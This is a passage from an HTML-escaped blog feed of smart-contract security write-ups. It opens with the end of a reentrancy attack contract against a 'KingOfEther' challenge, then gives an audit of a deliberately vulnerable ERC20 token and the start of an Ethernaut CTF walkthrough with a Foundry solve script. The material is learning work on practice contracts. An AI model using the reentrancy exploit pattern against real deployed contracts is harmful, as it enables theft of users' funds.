&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {  
&lt;&#x2F;span&gt;&lt;span&gt;        if(address(kingContract).balance &amp;gt;= 1 ether){
&lt;&#x2F;span&gt;&lt;span&gt;            kingContract.withdraw();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Call &lt;code&gt;deposit()&lt;&#x2F;code&gt; first then call &lt;code&gt;exploit()&lt;&#x2F;code&gt; to attack the &lt;code&gt;KingOfEther&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;vulnerable-erc20&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerable-erc20&quot; aria-label=&quot;Anchor link for: vulnerable-erc20&quot;&gt;Vulnerable ERC20&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-7&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-7&quot; aria-label=&quot;Anchor link for: description-7&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;ERC20 is a fungible token standard came from EIP20. ERC20 Tokens are widely used fungible tokens in ethereum. The ERC20 token must implement the necessary functions mentioned in the EIP20 proposal.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;observations-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#observations-2&quot; aria-label=&quot;Anchor link for: observations-2&quot;&gt;Observations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;The ERC20.sol file consists of a &lt;code&gt;SafeMath&lt;&#x2F;code&gt; library and a &lt;code&gt;ERC20&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;ERC20&lt;&#x2F;code&gt; contract uses SafeMath library on the uint256 instances.&lt;&#x2F;li&gt;
&lt;li&gt;It has basic state variables name, total_supply, symbol, decimals which are required for a ERC20 token.&lt;&#x2F;li&gt;
&lt;li&gt;It uses two mappings &lt;code&gt;_balances&lt;&#x2F;code&gt; and &lt;code&gt;allowances&lt;&#x2F;code&gt; to keep track balances of user and allowances of a user.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;balanceOf()&lt;&#x2F;code&gt; function returns the token balance of an address and &lt;code&gt;allowance()&lt;&#x2F;code&gt; returns approval amount of tokens by the owner to the spender.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;transfer()&lt;&#x2F;code&gt; function transfers the tokens between addresses. And emits &lt;code&gt;Transfer&lt;&#x2F;code&gt; event on transfer.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;approve()&lt;&#x2F;code&gt; function approves a spender to spend owner tokens. Emits &lt;code&gt;Approve&lt;&#x2F;code&gt; event on approval.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;transferFrom()&lt;&#x2F;code&gt; used to transfer the tokens on behalf of the token owner by the spender.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;differences-from-standard-erc20&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#differences-from-standard-erc20&quot; aria-label=&quot;Anchor link for: differences-from-standard-erc20&quot;&gt;Differences from Standard ERC20&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;Vulnerable ERC20 enables custom decimal places, while many ERC20 tokens follows the standard 18 decimals.&lt;&#x2F;li&gt;
&lt;li&gt;Owner will get the the &lt;code&gt;totalSupply&lt;&#x2F;code&gt; of token balance after deploying the token.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;approve()&lt;&#x2F;code&gt; function not checking the &lt;code&gt;to&lt;&#x2F;code&gt; address. (Missing zero address check).&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;transfer()&lt;&#x2F;code&gt; function is not following the standard ERC20 pattern.&lt;&#x2F;li&gt;
&lt;li&gt;Transferring tokens from one address to other address will transfer &lt;code&gt;6%&lt;&#x2F;code&gt; of tokens to the &lt;code&gt;owner&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;Transfer&lt;&#x2F;code&gt; event only emits with the actual &lt;code&gt;from&lt;&#x2F;code&gt; and &lt;code&gt;to&lt;&#x2F;code&gt; and &lt;code&gt;amount&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Transfer&lt;&#x2F;code&gt; event not emitted with the fee tokens sent to the &lt;code&gt;owner&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Also emitted token amount is the amount that user wants to send. Not the actual amount that being sent (minus comission).&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;TransferFrom()&lt;&#x2F;code&gt; function not checking for the allowed allowances, this not result in any token loss but overflow will occur if the amount passed to the TransferFrom is greater than the actual allowance&lt;&#x2F;li&gt;
&lt;li&gt;All the functions are &lt;code&gt;public&lt;&#x2F;code&gt; by default in standard ERC20.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;vulnerabilities-recommendations&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerabilities-recommendations&quot; aria-label=&quot;Anchor link for: vulnerabilities-recommendations&quot;&gt;Vulnerabilities &amp;amp; Recommendations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;approve()&lt;&#x2F;code&gt; allows the spender account using a given number of tokens by updating the value of allowance.&lt;&#x2F;li&gt;
&lt;li&gt;Suppose the spender account is able to control miners&#x27; confirming order of transferring, then spender could use up all allowance before approve comes into effect.&lt;&#x2F;li&gt;
&lt;li&gt;After approve() is effective, spender has access to the new allowance, causing total tokens spent greater than expected and resulting in Re-approve attack.&lt;&#x2F;li&gt;
&lt;li&gt;Using &lt;code&gt;increaseApprove()&lt;&#x2F;code&gt; and &lt;code&gt;decreaseApprove()&lt;&#x2F;code&gt; functions are the recommendatios for it.&lt;&#x2F;li&gt;
&lt;li&gt;Recommended to declare state variables private and use implement public functions to read them.&lt;&#x2F;li&gt;
&lt;li&gt;Its recommended to inherit OpenZeppelin ERC20 contract to use.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you !&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Ethernaut CTF</title>
        <published>2023-12-09T00:00:00+00:00</published>
        <updated>2023-12-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/ethernaut/"/>
        <id>https://themj0ln1r.github.io/writeups/ethernaut/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/ethernaut/">&lt;p&gt;Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;&quot; target=_blank&gt;ethernaut&lt;&#x2F;a&gt; CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges.&lt;&#x2F;p&gt;
&lt;p&gt;This repository can be useful as a template for the people who want&#x27;s to solve ethernaut by using foundry. I will try my best to explain the solutions to challenges.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Solution Repo : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;ethernaut-foundry&quot; target=_blank&gt;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;ethernaut-foundry&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Setup the codebase locally :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; git clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;ethernaut-foundry.git
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cd ethernaut-foundry
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The challenge contracts are in &lt;code&gt;&#x2F;src&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Solution scripts under &lt;code&gt;&#x2F;script&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You need to add a &lt;code&gt;.env&lt;&#x2F;code&gt; file and fill following required fieds.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;RPC_URL=
&lt;&#x2F;span&gt;&lt;span&gt;MY_ADDRESS=
&lt;&#x2F;span&gt;&lt;span&gt;PRIVATE_KEY=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Get some Sepolia Eth to your address. (I am using Sepolia Testnet to solve)&lt;&#x2F;p&gt;
&lt;h1 id=&quot;0-hello-ethernaut&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0-hello-ethernaut&quot; aria-label=&quot;Anchor link for: 0-hello-ethernaut&quot;&gt;0 Hello Ethernaut&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;This is a sanity check challenge to the ethernaut. The source code was given to us. We have to deploy the instance and call the &lt;code&gt;info()&lt;&#x2F;code&gt; method on it and follow the instructions to solve the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;level0.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Instance {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  string public password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint8 public infoNum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;42&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  string public theMethodName &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;The method name is method7123949.&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bool private cleared &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; constructor
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(string memory _password) public {
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;info&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;You will find what you need in info1().&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;info1&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Try info2(), but with &amp;quot;hello&amp;quot; as a parameter.&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;info2&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory param&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(param)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;hello&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;))) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;The property infoNum holds the number of the next info method to call.&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Wrong parameter.&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;info42&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;theMethodName is the name of the next method.&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;method7123949&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;If you know the password, submit it to authenticate().&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;authenticate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory passkey&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(passkey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(password))) {
&lt;&#x2F;span&gt;&lt;span&gt;      cleared &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getCleared&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;cleared&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;level0Solve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Instance} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;src&#x2F;level0.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Level0Solve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Instance public Level0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Instance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc770F44bFDAe8eD857FaBeaFF5A702B87eAeC331&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        string memory password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Level0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Password : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;password)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        Level0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;authenticate&lt;&#x2F;span&gt;&lt;span&gt;(password)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
